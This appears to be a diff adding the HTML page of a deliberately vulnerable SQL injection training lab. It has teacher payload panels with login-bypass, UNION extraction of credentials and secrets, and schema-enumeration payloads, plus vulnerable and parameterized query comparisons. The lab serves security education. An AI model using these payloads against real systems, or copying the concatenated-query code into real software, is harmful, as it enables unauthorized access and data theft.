@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EMS Portal — Employee Management System</title>
+  <meta name="description" content="Corporate Employee Management System — SQL Injection Vulnerability Lab" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════
+     LOGIN VIEW
+════════════════════════════════════════════════════ -->
+<div id="login-view">
+  <div class="login-scene">
+    <!-- Animated grid background -->
+    <div class="grid-bg"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <div class="login-wrap">
+      <!-- Card -->
+      <div class="login-card glass">
+        <div class="login-brand">
+          <div class="brand-icon">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/><line x1="12" y1="12" x2="12" y2="16"/><line x1="10" y1="14" x2="14" y2="14"/></svg>
+          </div>
+          <div>
+            <h1>EMS Portal</h1>
+            <p>Employee Management System</p>
+          </div>
+        </div>
+
+        <!-- Vulnerability Banner -->
+        <div class="vuln-banner" id="vuln-banner-login">
+          <span class="blink-dot"></span>
+          <span><strong>VULN-001</strong> — This endpoint is vulnerable to SQL Injection</span>
+        </div>
+
+        <form id="login-form" autocomplete="off">
+          <div class="field-group">
+            <label for="l-username">Username</label>
+            <div class="field-wrap">
+              <svg class="field-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+              <input id="l-username" name="username" type="text" placeholder="e.g. admin" spellcheck="false" />
+            </div>
+          </div>
+          <div class="field-group">
+            <label for="l-password">Password</label>
+            <div class="field-wrap">
+              <svg class="field-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <input id="l-password" name="password" type="text" placeholder="••••••••" spellcheck="false" />
+            </div>
+          </div>
+
+          <!-- Live SQL Preview -->
+          <div class="sql-box" id="login-sql-box">
+            <div class="sql-box-header">
+              <span class="sql-dot"></span>
+              <span>Live SQL Query</span>
+              <span class="sql-label-vuln">VULNERABLE</span>
+            </div>
+            <pre id="login-sql-display" class="sql-code"><span class="kw">SELECT</span> * <span class="kw">FROM</span> users
+<span class="kw">WHERE</span> username = '<span id="lq-user" class="inject-hl">...</span>'
+  <span class="kw">AND</span> password = '<span id="lq-pass" class="inject-hl">...</span>'</pre>
+          </div>
+
+          <button type="submit" class="btn btn-primary btn-full" id="login-btn">
+            <span>Sign In</span>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+          </button>
+        </form>
+
+        <!-- Login Result -->
+        <div id="login-result" class="login-result hidden">
+          <div class="result-status" id="lr-status"></div>
+          <div class="result-query-wrap">
+            <div class="result-ql">Executed Query:</div>
+            <pre id="lr-query" class="sql-code"></pre>
+          </div>
+          <div id="lr-data-wrap" class="hidden">
+            <div class="result-ql">Leaked Data:</div>
+            <pre id="lr-data" class="sql-code leak-data"></pre>
+          </div>
+        </div>
+
+        <!-- Teacher Payload Panel -->
+        <div class="teacher-panel" id="teacher-login-panel">
+          <button class="teacher-toggle-btn" onclick="toggleTeacherPanel('login')">
+            🎓 Teacher Payloads <span id="teacher-login-arrow">▼</span>
+          </button>
+          <div class="teacher-payloads hidden" id="teacher-login-payloads">
+            <div class="payload-item" onclick="fillLogin(&quot;admin'--&quot;, 'anything')">
+              <div class="pi-code">admin'--</div>
+              <div class="pi-desc">Comments out the password check → login as admin without a password</div>
+              <div class="pi-arrow">→</div>
+            </div>
+            <div class="payload-item" onclick="fillLogin(&quot;' OR '1'='1&quot;, &quot;' OR '1'='1&quot;)">
+              <div class="pi-code">' OR '1'='1</div>
+              <div class="pi-desc">Always-true condition → returns the first user in the table</div>
+              <div class="pi-arrow">→</div>
+            </div>
+            <div class="payload-item" onclick="fillLogin(&quot;' OR 1=1 LIMIT 1--&quot;, '')">
+              <div class="pi-code">' OR 1=1 LIMIT 1--</div>
+              <div class="pi-desc">Returns exactly one user regardless of credentials</div>
+              <div class="pi-arrow">→</div>
+            </div>
+            <div class="payload-item" onclick="fillLogin(&quot;admin'/*&quot;, 'ignored')">
+              <div class="pi-code">admin'/*</div>
+              <div class="pi-desc">Block-comment bypass variant</div>
+              <div class="pi-arrow">→</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right info panel -->
+      <div class="login-info-panel">
+        <div class="info-badge">⚠️ VULNERABLE LAB</div>
+        <h2>SQL Injection<br/>Training Environment</h2>
+        <p>This EMS application contains <strong>intentional SQL injection vulnerabilities</strong> for hands-on security education. Use the Teacher Mode inside to reveal attack payloads and query inspection tools.</p>
+        <div class="info-cves">
+          <div class="cve-item"><span class="cve-badge">CWE-89</span> SQL Injection</div>
+          <div class="cve-item"><span class="cve-badge">CWE-287</span> Auth Bypass</div>
+          <div class="cve-item"><span class="cve-badge">CWE-200</span> Data Exposure</div>
+        </div>
+        <div class="info-tip">
+          <strong>Try:</strong> Enter <code>admin'--</code> as the username with any password
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════
+     APP VIEW (shown after login / bypass)
+════════════════════════════════════════════════════ -->
+<div id="app-view" class="hidden">
+
+  <!-- Sidebar -->
+  <nav id="sidebar">
+    <div class="sidebar-brand">
+      <div class="brand-icon-sm">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/></svg>
+      </div>
+      <div class="brand-text">
+        <span class="brand-name">EMS Portal</span>
+        <span class="brand-sub">v2.4.1</span>
+      </div>
+    </div>
+
+    <div class="nav-section-label">Main</div>
+    <a class="nav-link active" data-section="dashboard" href="#" onclick="navigate('dashboard'); return false;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg>
+      Dashboard
+    </a>
+
+    <div class="nav-section-label" style="margin-top:12px">Vulnerable Endpoints</div>
+    <a class="nav-link" data-section="search" href="#" onclick="navigate('search'); return false;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      Employee Search
+      <span class="nav-badge red">VULN</span>
+    </a>
+    <a class="nav-link" data-section="lookup" href="#" onclick="navigate('lookup'); return false;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      ID Lookup
+      <span class="nav-badge red">VULN</span>
+    </a>
+
+    <div class="nav-section-label" style="margin-top:12px">Education</div>
+    <a class="nav-link" data-section="compare" href="#" onclick="navigate('compare'); return false;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg>
+      Fix Comparison
+      <span class="nav-badge green">LEARN</span>
+    </a>
+
+    <div class="sidebar-footer">
+      <div class="sidebar-user">
+        <div class="user-ava" id="sb-ava">A</div>
+        <div class="user-meta">
+          <span id="sb-name">User</span>
+          <span id="sb-role" class="user-role-badge">role</span>
+        </div>
+      </div>
+      <button class="btn-logout" onclick="logout()">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+        Logout
+      </button>
+    </div>
+  </nav>
+
+  <!-- Main area -->
+  <div id="main-area">
+    <!-- Top bar -->
+    <header id="topbar">
+      <div class="topbar-left">
+        <h2 id="page-title">Dashboard</h2>
+      </div>
+      <div class="topbar-right">
+        <div class="teacher-mode-wrap">
+          <label class="toggle" for="teacher-toggle">
+            <input type="checkbox" id="teacher-toggle" onchange="setTeacherMode(this.checked)" />
+            <span class="toggle-track"></span>
+          </label>
+          <span class="toggle-label">🎓 Teacher Mode</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- ── DASHBOARD ───────────────────────────────────────── -->
+    <section id="section-dashboard" class="section active">
+
+      <div class="stat-grid">
+        <div class="stat-card">
+          <div class="stat-icon blue"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
+          <div><div class="stat-val" id="stat-emp-count">7</div><div class="stat-lbl">Employees</div></div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon red"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></div>
+          <div><div class="stat-val">3</div><div class="stat-lbl">Vulnerabilities</div></div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon purple"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg></div>
+          <div><div class="stat-val">3</div><div class="stat-lbl">Hidden Tables</div></div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon green"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+          <div><div class="stat-val">3</div><div class="stat-lbl">Secure Endpoints</div></div>
+        </div>
+      </div>
+
+      <!-- Vuln summary -->
+      <div class="card">
+        <div class="card-header">
+          <h3>⚠️ Vulnerability Summary</h3>
+          <span class="tag-lab">LAB ENVIRONMENT</span>
+        </div>
+        <div class="vuln-rows">
+          <div class="vuln-row">
+            <span class="sev-badge critical">CRITICAL</span>
+            <div class="vuln-row-info">
+              <strong>Authentication Bypass — SQL Injection (Login)</strong>
+              <p>Unsanitized <code>username</code> and <code>password</code> fields concatenated directly into the SQL query. An unauthenticated attacker can bypass authentication entirely.</p>
+              <code class="endpoint">POST /api/login</code>
+              <span class="cwe-tag">CWE-89 · CWE-287</span>
+            </div>
+          </div>
+          <div class="vuln-row">
+            <span class="sev-badge critical">CRITICAL</span>
+            <div class="vuln-row-info">
+              <strong>Data Exfiltration via UNION Injection (Employee Search)</strong>
+              <p>The <code>name</code> query parameter is concatenated directly into the LIKE clause, enabling UNION-based extraction of all tables including <code>users</code> and <code>secrets</code>.</p>
+              <code class="endpoint">GET /api/employees/search?name=…</code>
+              <span class="cwe-tag">CWE-89 · CWE-200</span>
+            </div>
+          </div>
+          <div class="vuln-row">
+            <span class="sev-badge high">HIGH</span>
+            <div class="vuln-row-info">
+              <strong>SQL Injection in Numeric Parameter (ID Lookup)</strong>
+              <p>The route parameter <code>:id</code> is embedded into the query without type-casting or parameterization, enabling UNION extraction of arbitrary tables.</p>
+              <code class="endpoint">GET /api/employees/:id</code>
+              <span class="cwe-tag">CWE-89</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Employee table -->
+      <div class="card">
+        <div class="card-header"><h3>Employee Directory</h3></div>
+        <div class="table-wrap">
+          <table class="data-table" id="dash-emp-table">
+            <thead>
+              <tr><th>ID</th><th>Name</th><th>Department</th><th>Position</th><th>Email</th><th>Hire Date</th></tr>
+            </thead>
+            <tbody id="dash-emp-body">
+              <tr><td colspan="6" class="tbl-empty">Loading…</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ── EMPLOYEE SEARCH ────────────────────────────────── -->
+    <section id="section-search" class="section">
+      <div class="section-hdr">
+        <div>
+          <h2>Employee Search</h2>
+          <span class="endpoint-tag">GET /api/employees/search?name=…</span>
+        </div>
+        <div class="vuln-pill"><span class="blink-dot red"></span> SQL Injection Vulnerable</div>
+      </div>
+
+      <div class="two-col" id="search-two-col">
+        <!-- Left: search form + results -->
+        <div class="col-main">
+          <div class="card">
+            <div class="card-header">
+              <h3>Search Employees</h3>
+            </div>
+            <div class="search-bar">
+              <div class="search-input-wrap">
+                <svg class="si-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+                <input id="search-input" type="text" placeholder="Enter name (or SQL payload)…" autocomplete="off" oninput="updateSearchPreview()" onkeydown="if(event.key==='Enter') doSearch()" />
+              </div>
+              <button class="btn btn-primary" onclick="doSearch()">Search</button>
+            </div>
+            <div class="sql-box mtop">
+              <div class="sql-box-header">
+                <span class="sql-dot red"></span>
+                <span>Live SQL Query</span>
+                <span class="sql-label-vuln">VULNERABLE</span>
+              </div>
+              <pre id="search-sql" class="sql-code"><span class="kw">SELECT</span> id, name, department, email, position, hire_date
+<span class="kw">FROM</span> employees
+<span class="kw">WHERE</span> name <span class="kw">LIKE</span> '%<span id="sq-val" class="inject-hl"></span>%'</pre>
+            </div>
+          </div>
+
+          <div class="card" id="search-results-card">
+            <div class="card-header">
+              <h3>Query Results</h3>
+              <span id="search-count" class="count-badge">0 records</span>
+            </div>
+            <div class="table-wrap">
+              <table class="data-table" id="search-results-table">
+                <thead><tr id="search-thead-row"></tr></thead>
+                <tbody id="search-tbody">
+                  <tr><td class="tbl-empty">Run a search to see results</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right: teacher attack panel -->
+        <div class="col-attack hidden" id="search-attack-col">
+          <div class="attack-panel">
+            <div class="attack-panel-hdr">
+              <span>🎓 Payload Library</span>
+              <span class="ap-sub">Employee Search</span>
+            </div>
+
+            <div class="payload-group">
+              <div class="pg-title">Basic Injection</div>
+              <div class="payload-card" onclick="injectSearch(&quot;%' OR 1=1--&quot;)">
+                <div class="pc-code">%' OR 1=1--</div>
+                <div class="pc-desc">Escape the LIKE clause → always-true WHERE</div>
+                <div class="pc-effect">📤 Dumps entire employees table</div>
+              </div>
+              <div class="payload-card" onclick="injectSearch(&quot;' OR '1'='1&quot;)">
+                <div class="pc-code">' OR '1'='1</div>
+                <div class="pc-desc">Classic always-true condition</div>
+                <div class="pc-effect">📤 Returns all records</div>
+              </div>
+            </div>
+
+            <div class="payload-group">
+              <div class="pg-title">UNION Data Extraction</div>
+              <div class="payload-card highlight-red" onclick="injectSearch(&quot;' UNION SELECT 1,username,password,role,'x','y' FROM users--&quot;)">
+                <div class="pc-code">' UNION SELECT 1,username,<br/>password,role,'x','y'<br/>FROM users--</div>
+                <div class="pc-desc">Must match 6-column SELECT to pivot to users table</div>
+                <div class="pc-effect">🔑 Dumps all usernames & passwords</div>
+              </div>
+              <div class="payload-card highlight-red" onclick="injectSearch(&quot;' UNION SELECT 1,key_name,value,'admin','x','y' FROM secrets--&quot;)">
+                <div class="pc-code">' UNION SELECT 1,key_name,<br/>value,'admin','x','y'<br/>FROM secrets--</div>
+                <div class="pc-desc">Pivot to hidden secrets table</div>
+                <div class="pc-effect">🔐 Leaks API keys & credentials</div>
+              </div>
+            </div>
+
+            <div class="payload-group">
+              <div class="pg-title">Schema Enumeration</div>
+              <div class="payload-card" onclick="injectSearch(&quot;' UNION SELECT 1,name,sql,'a','b','c' FROM sqlite_master WHERE type='table'--&quot;)">
+                <div class="pc-code">' UNION SELECT 1,name,sql,<br/>'a','b','c'<br/>FROM sqlite_master WHERE type='table'--</div>
+                <div class="pc-desc">Query the schema catalog to list all tables</div>
+                <div class="pc-effect">🗺️ Reveals full database structure</div>
+              </div>
+            </div>
+
+            <div class="explain-box">
+              <div class="eb-title">Why does this work?</div>
+              <pre class="sql-code eb-code"><span class="kw">-- Server builds this string:</span>
+<span class="kw">SELECT</span> ... <span class="kw">FROM</span> employees
+<span class="kw">WHERE</span> name <span class="kw">LIKE</span> '%' <span class="kw">UNION SELECT</span>...--<span class="kw">%</span>'
+<span class="kw">                       ↑ injected here</span></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ── ID LOOKUP ──────────────────────────────────────── -->
+    <section id="section-lookup" class="section">
+      <div class="section-hdr">
+        <div>
+          <h2>Employee ID Lookup</h2>
+          <span class="endpoint-tag">GET /api/employees/:id</span>
+        </div>
+        <div class="vuln-pill"><span class="blink-dot red"></span> SQL Injection Vulnerable</div>
+      </div>
+
+      <div class="two-col" id="lookup-two-col">
+        <div class="col-main">
+          <div class="card">
+            <div class="card-header"><h3>Lookup Employee by ID</h3></div>
+            <div class="lookup-row">
+              <span class="url-prefix">/api/employees/</span>
+              <input id="lookup-input" type="text" value="1" autocomplete="off" oninput="updateLookupPreview()" onkeydown="if(event.key==='Enter') doLookup()" />
+              <button class="btn btn-primary" onclick="doLookup()">Lookup</button>
+            </div>
+            <div class="sql-box mtop">
+              <div class="sql-box-header">
+                <span class="sql-dot red"></span>
+                <span>Live SQL Query</span>
+                <span class="sql-label-vuln">VULNERABLE</span>
+              </div>
+              <pre id="lookup-sql" class="sql-code"><span class="kw">SELECT</span> * <span class="kw">FROM</span> employees
+<span class="kw">WHERE</span> id = <span id="lkq-val" class="inject-hl">1</span></pre>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <h3>Query Results</h3>
+              <span id="lookup-count" class="count-badge">0 records</span>
+            </div>
+            <div class="table-wrap">
+              <table class="data-table" id="lookup-results-table">
+                <thead><tr id="lookup-thead-row"></tr></thead>
+                <tbody id="lookup-tbody">
+                  <tr><td class="tbl-empty">Enter an ID to look up</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-attack hidden" id="lookup-attack-col">
+          <div class="attack-panel">
+            <div class="attack-panel-hdr">
+              <span>🎓 Payload Library</span>
+              <span class="ap-sub">ID Lookup</span>
+            </div>
+
+            <div class="payload-group">
+              <div class="pg-title">Basic Injection</div>
+              <div class="payload-card" onclick="injectLookup('1 OR 1=1')">
+                <div class="pc-code">1 OR 1=1</div>
+                <div class="pc-desc">Appends always-true condition after numeric param</div>
+                <div class="pc-effect">📤 Dumps all employees</div>
+              </div>
+              <div class="payload-card" onclick="injectLookup('1 OR 1=1 ORDER BY salary DESC')">
+                <div class="pc-code">1 OR 1=1 ORDER BY salary DESC</div>
+                <div class="pc-desc">Inject ORDER BY clause to sort results</div>
+                <div class="pc-effect">💰 Highest-paid employees first</div>
+              </div>
+            </div>
+
+            <div class="payload-group">
+              <div class="pg-title">UNION Data Extraction</div>
+              <div class="payload-card highlight-red" onclick="injectLookup(&quot;0 UNION SELECT 1,username,department,email,0,password,phone,hire_date,role FROM users&quot;)">
+                <div class="pc-code">0 UNION SELECT 1,username,<br/>department,email,0,password,<br/>phone,hire_date,role FROM users</div>
+                <div class="pc-desc">Maps users table to the 9-column employees schema</div>
+                <div class="pc-effect">🔑 Reveals all user credentials</div>
+              </div>
+              <div class="payload-card highlight-red" onclick="injectLookup(&quot;0 UNION SELECT 1,key_name,value,'N/A',0,'N/A','N/A','N/A','N/A' FROM secrets&quot;)">
+                <div class="pc-code">0 UNION SELECT 1,key_name,<br/>value,'N/A',0,'N/A','N/A',<br/>'N/A','N/A' FROM secrets</div>
+                <div class="pc-desc">Pivot to secrets via 9-column UNION</div>
+                <div class="pc-effect">🔐 Leaks API keys & passwords</div>
+              </div>
+            </div>
+
+            <div class="explain-box">
+              <div class="eb-title">Why does this work?</div>
+              <pre class="sql-code eb-code"><span class="kw">-- Server builds:</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> employees
+<span class="kw">WHERE</span> id = 0 <span class="kw">UNION SELECT</span>...
+<span class="kw">             ↑ no quotes — numeric param</span></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ── COMPARE ────────────────────────────────────────── -->
+    <section id="section-compare" class="section">
+      <div class="section-hdr">
+        <div>
+          <h2>Vulnerable vs. Secure — Fix Comparison</h2>
+          <span class="endpoint-tag">Parameterized Queries</span>
+        </div>
+      </div>
+
+      <div class="compare-tabs-bar">
+        <button class="ctab active" data-cmode="login"  onclick="setCompareMode('login')">Login</button>
+        <button class="ctab"        data-cmode="search" onclick="setCompareMode('search')">Employee Search</button>
+        <button class="ctab"        data-cmode="lookup" onclick="setCompareMode('lookup')">ID Lookup</button>
+      </div>
+
+      <!-- Login compare -->
+      <div class="compare-panel" id="cpanel-login">
+        <div class="compare-inputs">
+          <div class="field-group">
+            <label>Username</label>
+            <input id="c-login-user" type="text" value="admin'--" />
+          </div>
+          <div class="field-group">
+            <label>Password</label>
+            <input id="c-login-pass" type="text" value="wrongpassword" />
+          </div>
+          <button class="btn btn-primary" onclick="runCompareLogin()">▶ Run Both</button>
+        </div>
+        <div class="compare-grid">
+          <div class="compare-card vuln-card">
+            <div class="cc-hdr"><span class="cc-badge vuln-badge2">🔓 VULNERABLE</span><code>POST /api/login</code></div>
+            <div class="cc-section-label">Query Sent to DB:</div>
+            <pre class="sql-code cc-query" id="cc-login-vuln-q">—</pre>
+            <div class="cc-section-label">Result:</div>
+            <div class="cc-outcome" id="cc-login-vuln-r">—</div>
+          </div>
+          <div class="compare-card safe-card">
+            <div class="cc-hdr"><span class="cc-badge safe-badge">🛡️ SECURE</span><code>POST /api/secure/login</code></div>
+            <div class="cc-section-label">Query Sent to DB:</div>
+            <pre class="sql-code cc-query" id="cc-login-safe-q">—</pre>
+            <div class="cc-section-label">Result:</div>
+            <div class="cc-outcome" id="cc-login-safe-r">—</div>
+          </div>
+        </div>
+        <div class="fix-box">
+          <div class="fix-title">🔧 The Fix — Parameterized Queries</div>
+          <div class="fix-diff">
+            <div class="diff-col diff-bad">
+              <div class="diff-hdr">❌ Vulnerable Code</div>
+              <pre class="sql-code"># Direct interpolation
+query = f"""SELECT * FROM users
+WHERE username = '{username}'
+  AND password = '{password}'"""</pre>
+            </div>
+            <div class="diff-col diff-good">
+              <div class="diff-hdr">✅ Secure Code</div>
+              <pre class="sql-code"># Parameterized query
+query = "SELECT * FROM users
+WHERE username = ?
+  AND password = ?"
+db.execute(query, [username, password])</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Search compare -->
+      <div class="compare-panel hidden" id="cpanel-search">
+        <div class="compare-inputs">
+          <div class="field-group" style="flex:1">
+            <label>Search Term</label>
+            <input id="c-search-val" type="text" value="' UNION SELECT 1,username,password,role,'x','y' FROM users--" />
+          </div>
+          <button class="btn btn-primary" onclick="runCompareSearch()">▶ Run Both</button>
+        </div>
+        <div class="compare-grid">
+          <div class="compare-card vuln-card">
+            <div class="cc-hdr"><span class="cc-badge vuln-badge2">🔓 VULNERABLE</span><code>GET /api/employees/search</code></div>
+            <div class="cc-section-label">Query Sent to DB:</div>
+            <pre class="sql-code cc-query" id="cc-search-vuln-q">—</pre>
+            <div class="cc-section-label">Records Returned: <span id="cc-search-vuln-count">—</span></div>
+            <pre class="sql-code cc-data" id="cc-search-vuln-data" style="display:none;max-height:200px;overflow:auto"></pre>
+          </div>
+          <div class="compare-card safe-card">
+            <div class="cc-hdr"><span class="cc-badge safe-badge">🛡️ SECURE</span><code>GET /api/secure/employees/search</code></div>
+            <div class="cc-section-label">Query Sent to DB:</div>
+            <pre class="sql-code cc-query" id="cc-search-safe-q">—</pre>
+            <div class="cc-section-label">Records Returned: <span id="cc-search-safe-count">—</span></div>
+            <pre class="sql-code cc-data" id="cc-search-safe-data" style="display:none;max-height:200px;overflow:auto"></pre>
+          </div>
+        </div>
+        <div class="fix-box">
+          <div class="fix-title">🔧 The Fix — Parameterized LIKE Query</div>
+          <div class="fix-diff">
+            <div class="diff-col diff-bad">
+              <div class="diff-hdr">❌ Vulnerable Code</div>
+              <pre class="sql-code">query = f"""SELECT ...
+FROM employees
+WHERE name LIKE '%{name}%'"""</pre>
+            </div>
+            <div class="diff-col diff-good">
+              <div class="diff-hdr">✅ Secure Code</div>
+              <pre class="sql-code">query = """SELECT ...
+FROM employees
+WHERE name LIKE ?"""
+db.execute(query, [f"%{name}%"])</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Lookup compare -->
+      <div class="compare-panel hidden" id="cpanel-lookup">
+        <div class="compare-inputs">
+          <div class="field-group" style="flex:1">
+            <label>Employee ID</label>
+            <input id="c-lookup-val" type="text" value="0 UNION SELECT 1,username,department,email,0,password,phone,hire_date,role FROM users" />
+          </div>
+          <button class="btn btn-primary" onclick="runCompareLookup()">▶ Run Both</button>
+        </div>
+        <div class="compare-grid">
+          <div class="compare-card vuln-card">
+            <div class="cc-hdr"><span class="cc-badge vuln-badge2">🔓 VULNERABLE</span><code>GET /api/employees/:id</code></div>
+            <div class="cc-section-label">Query Sent to DB:</div>
+            <pre class="sql-code cc-query" id="cc-lookup-vuln-q">—</pre>
+            <div class="cc-section-label">Records Returned: <span id="cc-lookup-vuln-count">—</span></div>
+            <pre class="sql-code cc-data" id="cc-lookup-vuln-data" style="display:none;max-height:200px;overflow:auto"></pre>
+          </div>
+          <div class="compare-card safe-card">
+            <div class="cc-hdr"><span class="cc-badge safe-badge">🛡️ SECURE</span><code>GET /api/secure/employees/:id</code></div>
+            <div class="cc-section-label">Query Sent to DB:</div>
+            <pre class="sql-code cc-query" id="cc-lookup-safe-q">—</pre>
+            <div class="cc-section-label">Records Returned: <span id="cc-lookup-safe-count">—</span></div>
+            <pre class="sql-code cc-data" id="cc-lookup-safe-data" style="display:none;max-height:200px;overflow:auto"></pre>
+          </div>
+        </div>
+        <div class="fix-box">
+          <div class="fix-title">🔧 The Fix — Cast and Parameterize</div>
+          <div class="fix-diff">
+            <div class="diff-col diff-bad">
+              <div class="diff-hdr">❌ Vulnerable Code</div>
+              <pre class="sql-code">id = req.params.id
+query = `SELECT * FROM employees
+WHERE id = ${id}`</pre>
+            </div>
+            <div class="diff-col diff-good">
+              <div class="diff-hdr">✅ Secure Code</div>
+              <pre class="sql-code">id = req.params.id
+query = "SELECT * FROM employees
+WHERE id = ?"
+db.prepare(query).all(id)</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div><!-- /main-area -->
+</div><!-- /app-view -->
+
+<!-- Toast -->
+<div id="toast" class="toast hidden"></div>
+
+<script src="app.js"></script>
+</body>
+</html>
